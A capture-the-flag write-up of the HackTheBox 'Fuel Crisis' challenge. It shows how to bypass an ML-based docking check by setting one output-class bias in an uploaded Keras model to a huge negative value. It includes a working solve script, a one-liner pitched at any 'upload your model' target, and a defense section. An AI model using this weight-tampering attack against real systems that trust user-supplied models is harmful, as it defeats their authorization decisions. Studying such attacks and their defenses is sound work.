---
layout: post
title: "HackTheBox Challenge: Fuel Crisis"
date: 2027-10-08 09:00:00 -0500
categories: [HackTheBox, Challenges]
tags: [hackthebox, challenge, ai-ml, adversarial-ml, model-tampering, keras, h5py, trust-boundary, cwe-501]
---

## Overview

Fuel Crisis is an Easy **AI/ML** challenge. A space station uses an OCR camera (an MNIST CNN) to read the ID of every ship that docks, and our ship — *Phalcon* — carries the banned ID `32166`. The catch: the app lets us **upload our own model** to be used as the second camera. The whole solve is one surgical edit to that model's weights so the banned ID is misread, while every other ship is still identified correctly. It's a textbook trust-boundary violation ([CWE-501](https://cwe.mitre.org/data/definitions/501.html)) — the model is treated as ground truth even though the attacker supplies it.

## The technique

The docking routine runs every ship through two gates:

- The **first gate** uses the station's own fixed model to read each digit and record a confidence.
- The **second gate** uses *our uploaded model*. For the four other ships it checks that our model's confidence at the first gate's predicted digit still matches (rounded to 1 decimal). For Phalcon this confidence check is disabled — the only thing that matters is that our model does **not** read its ID as `32166`.

So we need a model that misreads Phalcon's `32166` but leaves the other four IDs (`13376`, `66594`, `10054`, `88519`) untouched. Look at the digits:

| Ship | ID | digits |
|------|-----|--------|
| IFG-Wing | 13376 | 1,3,3,7,6 |
| Nebulon-B | 66594 | 6,6,5,9,4 |
| Star Destroyer | 10054 | 1,0,0,5,4 |
| IFG-Gunship | 88519 | 8,8,5,1,9 |
| **Phalcon (us)** | **32166** | 3,**2**,1,6,6 |

The digit **`2` appears only in Phalcon's ID.** If the model is made to *never* predict the class `2`, then `32166` is read as `3X166` (≠ banned, so it docks), while no other ship contains a `2`, so they are completely unaffected.

The model ends in a `Dense(10, softmax)` layer. Each output class is an independent affine function of the penultimate features, `logit_c = W[:,c]·x + b_c`, so setting the **bias of output neuron 2** to a huge negative value drives `P(class 2) → 0` for every input without touching the decision surface of the other nine classes. For a non-`2` digit that probability was already ~0, so the confidence check still passes. The challenge name says it outright — we're *attacking the last layer*.

## Solution

Because we only change weight *values* (not the model graph), there's no need for TensorFlow at all — `h5py` can patch the HDF5 file in place. Inspect the layer names first with `f.visititems(...)`, then zero out class 2:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, h5py, shutil, os

HOST, PORT = sys.argv[1], sys.argv[2]
BASE = f"http://{HOST}:{PORT}"
HERE = os.path.dirname(os.path.abspath(__file__))
SRC  = os.path.join(HERE, "model.h5")
OUT  = os.path.join(HERE, "uploaded.h5")

# Forge weights: kill output class 2 (edit in place, keep all structure).
shutil.copy(SRC, OUT)
with h5py.File(OUT, "r+") as f:
    f["model_weights/dense/dense/bias:0"][2] = -1e9

# Upload as the second gate.
with open(OUT, "rb") as fh:
    requests.post(f"{BASE}/", files={"file": ("uploaded.h5", fh, "application/octet-stream")})

# Dock -> flag.
import re
r = requests.post(f"{BASE}/dock")
m = re.search(r"HTB\{[^}]+\}", r.text)
print("FLAG:", m.group(0) if m else r.text[:400])
```

Run it against the live instance:

```bash
python3 solve.py <target-host> <target-port>
# FLAG: HTB{...}
```

The one-liner version of the weight edit, for any "upload your model" target:

```bash
python3 -c "import h5py,shutil;shutil.copy('model.h5','uploaded.h5');f=h5py.File('uploaded.h5','r+');f['model_weights/dense/dense/bias:0'][2]=-1e9;f.close()"
```

## Why it worked

The application accepts an **attacker-supplied model** and then uses its predictions as a security decision. A model is not a trust boundary. Because a softmax classifier's per-class output is an independent affine function of the features, a single bias edit deletes exactly one class's decision and nothing else — precisely what the "keep the other four ships correct" constraint demands. And the integrity check (confidence at the predicted class) only looks at one number, which a class-2 suppression leaves unchanged for any non-`2` digit.

## Fix / defense

- **Never let an untrusted party supply the model used for an authorization decision.** Pin a server-side model; if user models are unavoidable, sandbox them and treat their output as untrusted.
- **Integrity-check uploaded weights** (hash / signature allowlist) and reject any model whose outputs deviate from a trusted baseline on a fixed probe set.
- **Validate the whole output distribution**, not a single confidence value, and apply the same checks to *every* subject — disabling validation for any one input (here, Phalcon) is what made the bypass trivial.
